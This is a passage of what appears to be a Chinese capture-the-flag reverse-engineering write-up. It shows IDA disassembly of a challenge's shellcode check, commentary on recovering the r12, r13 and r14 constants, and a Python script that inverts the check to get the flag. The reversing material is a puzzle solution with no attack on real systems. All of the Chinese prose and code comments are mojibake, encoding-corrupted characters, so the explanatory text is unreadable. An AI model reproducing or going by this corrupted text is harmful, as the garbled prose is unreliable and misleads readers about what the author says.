379F3A62B80657A1h\n.rodata:000055E808DA1B39 mov     rdx, 37F7494DD66F358Eh\n.rodata:000055E808DA1B43 xor     rcx, rdx\n.rodata:000055E808DA1B46 push    rcx\n.rodata:000055E808DA1B47 push    rsp\n.rodata:000055E808DA1B48 pop     rdi                             ; filename\n.rodata:000055E808DA1B49 push    2\n.rodata:000055E808DA1B4B pop     rax\n.rodata:000055E808DA1B4C cdq                                     ; mode\n.rodata:000055E808DA1B4D syscall                                 ; LINUX - sys_open\n.rodata:000055E808DA1B4F xchg    rax, rdi                        ; fd\n.rodata:000055E808DA1B51 xor     eax, eax\n.rodata:000055E808DA1B53 push    rax\n.rodata:000055E808DA1B54 push    rsp\n.rodata:000055E808DA1B55 pop     rsi                             ; buf\n.rodata:000055E808DA1B56 push    4\n.rodata:000055E808DA1B58 pop     rdx                             ; count\n.rodata:000055E808DA1B59 syscall                                 ; LINUX - sys_read\n.rodata:000055E808DA1B5B pop     r12\n.rodata:000055E808DA1B5D push    3\n.rodata:000055E808DA1B5F pop     rax\n.rodata:000055E808DA1B60 syscall                                 ; LINUX - sys_close\n.rodata:000055E808DA1B62 xor     esi, esi                        ; flags\n.rodata:000055E808DA1B64 mov     rcx, 0AAC06463C36F3B3Bh\n.rodata:000055E808DA1B6E mov     rdx, 0AAC06463C30B4C48h\n.rodata:000055E808DA1B78 xor     rcx, rdx\n.rodata:000055E808DA1B7B push    rcx\n.rodata:000055E808DA1B7C mov     rcx, 7DA9F8D67582578Ch\n.rodata:000055E808DA1B86 mov     rdx, 0EC888F916F632A3h\n.rodata:000055E808DA1B90 xor     rcx, rdx\n.rodata:000055E808DA1B93 push    rcx\n.rodata:000055E808DA1B94 push    rsp\n.rodata:000055E808DA1B95 pop     rdi                             ; filename\n.rodata:000055E808DA1B96 push    2\n.rodata:000055E808DA1B98 pop     rax\n.rodata:000055E808DA1B99 cdq                                     ; mode\n.rodata:000055E808DA1B9A syscall                                 ; LINUX - sys_open\n.rodata:000055E808DA1B9C xchg    rax, rdi                        ; fd\n.rodata:000055E808DA1B9E xor     eax, eax\n.rodata:000055E808DA1BA0 push    rax\n.rodata:000055E808DA1BA1 push    rsp\n.rodata:000055E808DA1BA2 pop     rsi                             ; buf\n.rodata:000055E808DA1BA3 push    4\n.rodata:000055E808DA1BA5 pop     rdx                             ; count\n.rodata:000055E808DA1BA6 syscall                                 ; LINUX - sys_read\n.rodata:000055E808DA1BA8 pop     r13\n.rodata:000055E808DA1BAA push    3\n.rodata:000055E808DA1BAC pop     rax\n.rodata:000055E808DA1BAD syscall                                 ; LINUX - sys_close\n.rodata:000055E808DA1BAF xor     esi, esi                        ; flags\n.rodata:000055E808DA1BB1 push    6Fh ; 'o'\n.rodata:000055E808DA1BB3 mov     rcx, 77D9F62D0C06E559h\n.rodata:000055E808DA1BBD mov     rdx, 5BC8C027A638176h\n.rodata:000055E808DA1BC7 xor     rcx, rdx\n.rodata:000055E808DA1BCA push    rcx\n.rodata:000055E808DA1BCB push    rsp\n.rodata:000055E808DA1BCC pop     rdi                             ; filename\n.rodata:000055E808DA1BCD push    2\n.rodata:000055E808DA1BCF pop     rax\n.rodata:000055E808DA1BD0 cdq                                     ; mode\n.rodata:000055E808DA1BD1 syscall                                 ; LINUX - sys_open\n.rodata:000055E808DA1BD3 xchg    rax, rdi                        ; fd\n.rodata:000055E808DA1BD5 xor     eax, eax\n.rodata:000055E808DA1BD7 push    rax\n.rodata:000055E808DA1BD8 push    rsp\n.rodata:000055E808DA1BD9 pop     rsi                             ; buf\n.rodata:000055E808DA1BDA push    4\n.rodata:000055E808DA1BDC pop     rdx                             ; count\n.rodata:000055E808DA1BDD syscall                                 ; LINUX - sys_read\n.rodata:000055E808DA1BDF pop     rax\n.rodata:000055E808DA1BE0 not     rax\n.rodata:000055E808DA1BE3 shr     rax, 1Dh\n.rodata:000055E808DA1BE7 cqo\n.rodata:000055E808DA1BE9 push    29h ; ')'\n.rodata:000055E808DA1BEB pop     rcx\n.rodata:000055E808DA1BEC div     rcx\n.rodata:000055E808DA1BEF xchg    rax, r14\n.rodata:000055E808DA1BF1 push    3\n.rodata:000055E808DA1BF3 pop     rax\n.rodata:000055E808DA1BF4 syscall                                 ; LINUX - sys_close\n.rodata:000055E808DA1BF6 mov     eax, 267814C2h\n.rodata:000055E808DA1BFB add     eax, r12d\n.rodata:000055E808DA1BFE xor     eax, r13d\n.rodata:000055E808DA1C01 ror     eax, 0Bh\n.rodata:000055E808DA1C04 not     eax\n.rodata:000055E808DA1C06 xor     eax, r14d\n.rodata:000055E808DA1C09 cmp     eax, 31FF2788h\n.rodata:000055E808DA1C0E jnz     short loc_55E808DA1C15\n.rodata:000055E808DA1C0E\n.rodata:000055E808DA1C10 push    1\n.rodata:000055E808DA1C12 pop     rax\n.rodata:000055E808DA1C13 jmp     short loc_55E808DA1C18\n.rodata:000055E808DA1C13\n.rodata:000055E808DA1C15 ; ---------------------------------------------------------------------------\n.rodata:000055E808DA1C15\n.rodata:000055E808DA1C15 loc_55E808DA1C15:                       ; CODE XREF: sub_55E808DA1B2B+E3â†‘j\n.rodata:000055E808DA1C15 xor     rax, rax\n.rodata:000055E808DA1C15\n.rodata:000055E808DA1C18\n.rodata:000055E808DA1C18 loc_55E808DA1C18:                       ; CODE XREF: sub_55E808DA1B2B+E8â†‘j\n.rodata:000055E808DA1C18 push    rax\n.rodata:000055E808DA1C19 push    rbx\n.rodata:000055E808DA1C1A pop     rdi                             ; fd\n.rodata:000055E808DA1C1B push    rsp\n.rodata:000055E808DA1C1C pop     rsi                             ; buf\n.rodata:000055E808DA1C1D push    8\n.rodata:000055E808DA1C1F pop     rdx                             ; count\n.rodata:000055E808DA1C20 push    1\n.rodata:000055E808DA1C22 pop     rax\n.rodata:000055E808DA1C23 syscall                                 ; LINUX - sys_write\n.rodata:000055E808DA1C25 push    rbp\n.rodata:000055E808DA1C26 pop     rsp\n.rodata:000055E808DA1C27 jmp     r15\n.rodata:000055E808DA1C27\n.rodata:000055E808DA1C27 sub_55E808DA1B2B endp\n.rodata:000055E808DA1C27\n</code></pre>\n<p>å‘ç°ä¹‹å‰èµ‹å€¼çš„ input å’Œæ¯”è¾ƒæ•°æ®éƒ½è·‘è¿™é‡Œæ¥äº†</p>\n<p><img data-src=\"/images/image-20230910154637077.png\" alt=\"image-20230910154637077\"></p>\n<p><strong>add     eax, r12d</strong> #é¦–å…ˆå°† eax ä¸ r12d ç›¸åŠ <br>\n<strong> xor     eax, r13d</strong> #ç„¶åå°† eax ä¸ r13d è¿›è¡Œå¼‚æˆ–è¿ç®—<br>\n<strong> ror     eax, 0Bh</strong> #æ¥ç€å°† eax å‘å³æ—‹è½¬ 11 ä½<br>\n<strong> not     eax</strong># ç„¶åå¯¹ eax æ±‚å<br>\n<strong> xor     eax, r14d</strong># å†å°† eax ä¸ r14d è¿›è¡Œå¼‚æˆ–è¿ç®—</p>\n<p>å…³é”®å°±æ˜¯ä¸Šé¢å‡ æ¡æ±‡ç¼–æŒ‡ä»¤äº† å¯¹ input è¿˜è¿›è¡Œäº†æ“ä½œ</p>\n<p>å…³é”®å°±æ˜¯æ‰¾åˆ° r12 r13 r14 çš„å€¼</p>\n<p>ä½†è¿™ä¸ª shellcode åœ¨ç¨‹åºä¸­å¥½åƒæ²¡æœ‰æ‹¿å‡ºæ¥æ‰§è¡Œ (ä¹Ÿå¯èƒ½æ˜¯å› ä¸ºæˆ‘ä¸ä¼šè°ƒ)</p>\n<p>è€Œä¸”è¿™ä¸ªç¨‹åºå¥½åƒå°±å•çº¯çš„éªŒè¯äº†æœåŠ¡å™¨ç«¯å’Œå®¢æœç«¯çš„è¾“å…¥æ˜¯å¦ç›¸åŒ æœ‰ç‚¹é—¹éº»</p>\n<p><img data-src=\"/images/image-20230910163931689.png\" alt=\"image-20230910163931689\"></p>\n<p>(æœ‰ä¸€ä¸ª std::io::default_read_exact æ˜¯ä»å®¢æœç«¯æ¥å—ï¼Œä» IDA åŠ¨æ€è°ƒè¯•ä¼šå¡ä½ä¹Ÿèƒ½å‘ç°è¿™ä¸€ç‚¹)</p>\n<p>åˆ†æ shellcode å¯ä»¥å¾—å‡º r12 r13 r14 æ˜¯å®šå€¼</p>\n<p>åˆ†ææ–¹æ³•ï¼šéšä¾¿æ‰¾ä¸€ä¸ªç®€å•çš„ç¨‹åº ç”¨ IDApatch æˆ shellcode æ‰§è¡Œä¸€ä¸‹å°±è¡Œäº†</p>\n<p>ç›´æ¥ç”¨ lazyIDA paste data</p>\n<p><img data-src=\"/images/image-20230910180732823.png\" alt=\"image-20230910180732823\"></p>\n<p><img data-src=\"/images/image-20230910181123412.png\" alt=\"image-20230910181123412\"></p>\n<p>å¯ä»¥å‘ç° r12 r13 r14 çš„å®šå€¼æ˜¯å¤šå°‘ ç„¶åå°±ç›´æ¥å†™ exp è„šæœ¬è§£å¾— flag å°± OK äº†</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> numpy <span class=\"token keyword\">as</span> np</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">decrypt</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">:</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">,</span> table<span class=\"token punctuation\">:</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    tmp<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> data<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        tmp<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>table<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">return</span> tmp</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">reverse_order</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">:</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">,</span> table<span class=\"token punctuation\">:</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    tmp <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">64</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        tmp<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">[</span>table<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">return</span> tmp</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œæ¥å—ä¸€ä¸ªå‚æ•°ï¼Œè¿”å›è§£å¯†åçš„å€¼</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">de_cmp</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token comment\"># å®šä¹‰ r12, r13, r14 çš„å€¼</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    r12 <span class=\"token operator\">=</span> <span class=\"token number\">0x0000000464C457F</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    r13 <span class=\"token operator\">=</span> <span class=\"token number\">0x0000000746F6F72</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r14 <span class=\"token operator\">=</span> <span class=\"token number\">0x000000031F3831F</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token comment\"># å°† x è½¬æ¢ä¸ºæ— ç¬¦å· 32 ä½æ•´æ•°</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    x <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>uint32<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token comment\"># å°† x ä¸ r14 å¼‚æˆ–</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    x <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>uint32<span class=\"token punctuation\">(</span>x <span class=\"token operator\">^</span> r14<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token comment\"># å°† x å–å</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    x <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>uint32<span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token comment\"># å°† x å·¦æ—‹ 11 ä½</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    x <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>uint32<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>x <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">11</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span>x <span class=\"token operator\">>></span> <span class=\"token punctuation\">(</span><span class=\"token number\">32</span> <span class=\"token operator\">-</span> <span class=\"token number\">11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token comment\"># å°† x ä¸ r13 å¼‚æˆ–</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    x <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>uint32<span class=\"token punctuation\">(</span>x <span class=\"token operator\">^</span> r13<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token comment\"># å°† x å‡å» r12</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    x <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>uint32<span class=\"token punctuation\">(</span>x <span class=\"token operator\">-</span> r12<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token comment\"># æ‰“å° x çš„åå…­è¿›åˆ¶è¡¨ç¤º</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token comment\"># å°† x è½¬æ¢ä¸ºæœ‰ç¬¦å· 32 ä½æ•´æ•°</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    x <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>int32<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token comment\"># è¿”å› x çš„å››ä¸ªå­—èŠ‚</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">[</span>x <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xff</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>x <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xff00</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>x <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xff0000</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>x <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xff000000</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">24</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token comment\">#get crypto table</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>s0_255 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0xFB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x51</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x63</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x35</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x30</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x43</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x24</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x83</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x69</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x59</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x66</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x97</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x61</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xED</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x27</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x06</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x25</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE7</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x32</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x93</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x81</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x58</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x16</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x75</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x71</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x39</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x99</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x09</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x86</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x74</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF9</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token number\">0xFA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x94</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x89</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x65</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x88</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x77</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x11</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x48</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x47</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x62</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x96</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x13</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x53</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x33</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x29</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x44</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x52</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x31</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x34</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x54</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA1</span><span class=\"token punctuation\">,</span> <span class=\"token 